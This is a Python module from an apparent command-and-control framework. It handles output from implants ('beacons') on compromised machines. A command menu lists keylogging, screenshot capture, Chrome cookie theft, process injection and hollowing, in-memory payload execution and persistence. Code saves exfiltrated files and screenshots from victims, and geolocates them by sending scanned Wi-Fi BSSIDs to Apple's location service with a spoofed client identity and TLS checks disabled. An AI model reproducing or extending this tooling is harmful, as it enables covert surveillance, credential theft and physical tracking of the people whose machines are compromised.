"""Helpers for C2 shell beacon interaction."""
import base64
import json
import os
import ssl
import urllib.request
import urllib.error
from datetime import datetime

from phantom.utils.paths import data_dir


BEACON_COMMANDS = """
[bold]Recon:[/]      recon, ls/dir, drives, find, sysinfo, netinfo, processes, pwd, cd, cat, whoami
[bold]Netstat:[/]    netstat, netstat-json
[bold]Transfer:[/]   download <path>  |  upload <path> <base64>
[bold]Portfwd:[/]    portfwd <local> <remote_host> <remote_port>  |  portfwd-stop
[bold]SOCKS5:[/]     socks <local_port>  |  socks-stop  [dim](Windows only)[/]
[bold]SMB Pipe:[/]   smb-pipe [name]  |  smb-pipe-stop  [dim](Windows only)[/]
[bold]Browser:[/]    browser-pivot <local_port> [pid]  |  browser-pivot-stop  |  browser-list  [dim](Windows only)[/]
[bold]CDP:[/]        cdp-launch, cdp-cookies, cdp-eval, cdp-nav, cdp-fetch  [dim](Windows only)[/]
[bold]Keylog:[/]     keylog start|stop|status|dump [filter]  [dim](Windows only)[/]
[bold]Screenshot:[/] screenshot  [dim](Windows only)[/]
[bold]Cookies:[/]    cookies, cookies-json  [dim](Chrome DPAPI)[/]
[bold]WiFi/BT:[/]    wlan-scan, wlan-locate, bt-scan, bt-scan-json
[bold]Injection:[/]  inject <pid> [dim](new beacon in PID, original stays — 2 beacons)[/dim] | migrate [dim](hollow new process, original exits — 1 beacon)[/dim] | mem-run <b64> [dim](Windows only)[/dim]
[bold]Persistence:[/] autopersist  [dim](Auto-detect)[/]
[bold]Shell:[/]      shell <cmd>  |  any OS command
[bold]Config:[/]     sleep <ms>  |  exit/kill
"""


def save_beacon_download(b64_data: str, suggested_name: str = "") -> str:
    """Decode base64 file data from beacon and save to data/downloads/."""
    out_dir = os.path.join(data_dir(), "downloads")
    os.makedirs(out_dir, exist_ok=True)
    name = suggested_name or f"beacon_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
    name = os.path.basename(name.replace("\\", "/"))
    path = os.path.join(out_dir, name)
    data = base64.b64decode(b64_data)
    with open(path, "wb") as f:
        f.write(data)
    return path


# ── Apple WLOC (free WiFi geolocation, no API key) ─────────────────────────

_APPLE_ENDPOINT = "https://gs-loc.apple.com/clls/wloc"
_APPLE_UA = "locationd/1753.17 CFNetwork/711.1.12 Darwin/14.0.0"


def _varint(buf: bytes, pos: int) -> tuple[int, int]:
    """Decode a protobuf varint at buf[pos], return (value, new_pos)."""
    v = 0
    shift = 0
    while pos < len(buf):
        b = buf[pos]
        v |= (b & 0x7F) << shift
        shift += 7
        pos += 1
        if not (b & 0x80):
            break
    return v, pos


def _parse_apple_wloc(data: bytes) -> list:
    """Parse Apple WLOC binary protobuf response into [(lat, lon), ...]."""
    if len(data) <= 10:
        return []
    offset = 10
    results = []

    while offset < len(data):
        tag, offset = _varint(data, offset)
        field_num = tag >> 3
        wire_type = tag & 0x07

        if wire_type == 0:
            _, offset = _varint(data, offset)
        elif wire_type == 2:
            length, offset = _varint(data, offset)
            if field_num == 2:
                end = offset + length
                loc_lat = None
                loc_lon = None
                while offset < end:
                    inner_tag, offset = _varint(data, offset)
                    inner_field = inner_tag >> 3
                    inner_wire = inner_tag & 0x07
                    if inner_wire == 2:
                        l, offset = _varint(data, offset)
                        if inner_field == 2:
                            loc_end = offset + l
                            loc_lat = None
                            loc_lon = None
                            while offset < loc_end:
                                loc_tag, offset = _varint(data, offset)
                                loc_field = loc_tag >> 3
                                loc_wire = loc_tag & 0x07
                                if loc_wire == 0:
                                    val, offset = _varint(data, offset)
                                    if loc_field == 1:
                                        loc_lat = val
                                    elif loc_field == 2:
                                        loc_lon = val
                                elif loc_wire == 2:
                                    ll, offset = _varint(data, offset)
                                    offset += ll
                                elif loc_wire == 5:
                                    offset += 4
                                elif loc_wire == 1:
                                    offset += 8
                            if loc_lat is not None and loc_lon is not None:
                                results.append((loc_lat / 1e8, loc_lon / 1e8))
                        else:
                            offset += l
                    elif inner_wire == 0:
                        _, offset = _varint(data, offset)
                    elif inner_wire == 5:
                        offset += 4
                    elif inner_wire == 1:
                        offset += 8
            else:
                offset += length
        elif wire_type == 5:
            offset += 4
        elif wire_type == 1:
            offset += 8
        else:
            break

    return results


def _apple_build_request(bssid: str) -> bytes:
    """Build binary request body for Apple WLOC."""
    bssid_bytes = bssid.encode()
    data_bssid = b'\x12\x13\n\x11' + bssid_bytes + b'\x18\x00\x20\x01'
    header = b'\x00\x01\x00\x05en_US\x00\x13com.apple.locationd\x00\x0a8.1.12B411\x00\x00\x00\x01\x00\x00\x00'
    return header + bytes([len(data_bssid)]) + data_bssid


def _apple_geolocate(aps: list) -> str:
    """Query Apple's WiFi location service using the first AP's BSSID."""
    if not aps:
        return ""

    bssid = aps[0].get("macAddress", "").upper()
    if not bssid or len(bssid) != 17:
        return "\nInvalid BSSID format."

    try:
        body = _apple_build_request(bssid)
        req = urllib.request.Request(
            _APPLE_ENDPOINT,
            data=body,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
                "User-Agent": _APPLE_UA,
            })
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            raw = resp.read()

        locs = _parse_apple_wloc(raw)
        if locs:
            lat, lon = locs[0]
            return (
                f"\nGPS coordinates: {lat:.6f}, {lon:.6f}\n"
                f"Google Maps: https://www.google.com/maps?q={lat},{lon}\n"
                f"Source: Apple WLOC (free, no key needed)"
            )
        return "\nApple WLOC: No location data returned (AP not in database)."
    except urllib.error.HTTPError as e:
        return f"\nApple WLOC HTTP {e.code}: {e.read().decode(errors='replace')[:300]}"
    except Exception as e:
        return f"\nApple WLOC error: {e}"


def _format_wlan_table(aps: list) -> str:
    """Format AP list as a readable table."""
    lines = [f"=== WLAN GEOLOCATE RESULTS ({len(aps)} APs) ===",
             "BSSID              | RSSI | Ch | SSID",
             "-------------------+------+----+---------------------------"]
    for ap in aps:
        bssid = ap.get("macAddress", "?")
        rssi = ap.get("signalStrength", "?")
        ch = ap.get("channel", "?")
        ssid = ap.get("ssid", "?")
        if len(ssid) > 25:
            ssid = ssid[:22] + "..."
        lines.append(f"{bssid:18s} | {rssi:>4} | {ch:>2} | {ssid}")
    lines.append("")
    lines.append("(GPS coordinates queried via Apple WLOC, free — no API key)")
    return "\n".join(lines)


# ── Main dispatch ──────────────────────────────────────────────────────────

def format_beacon_output(output: str) -> tuple[str, str]:
    """
    Process beacon task output. Returns (display_text, extra_info).
    Auto-saves FILE_B64 downloads and SCREENSHOT_B64 captures.
    """
    if output.startswith("WLAN_GEOLOCATE:"):
        raw = output[len("WLAN_GEOLOCATE:"):]
        try:
            aps = json.loads(raw)
            display = _format_wlan_table(aps)
            coords = _apple_geolocate(aps)
            if coords:
                display += coords
        except json.JSONDecodeError:
            display = raw
        return display, ""

    if output.startswith("FILE_B64:"):
        try:
            path = save_beacon_download(output[9:])
            size = os.path.getsize(path)
            return f"[File downloaded — {size} bytes]", f"Saved to: {path}"
        except Exception as e:
            return f"[File decode failed: {e}]", ""

    if output.startswith("SCREENSHOT_B64:"):
        try:
            path = save_beacon_download(output[15:], suggested_name=f"screenshot_{datetime.now().strftime('%H%M%S')}.bmp")
            size = os.path.getsize(path)
            return f"[Screenshot captured — {size} bytes]", f"Saved to: {path}"
        except Exception as e:
            return f"[Screenshot decode failed: {e}]", ""

    return output, ""
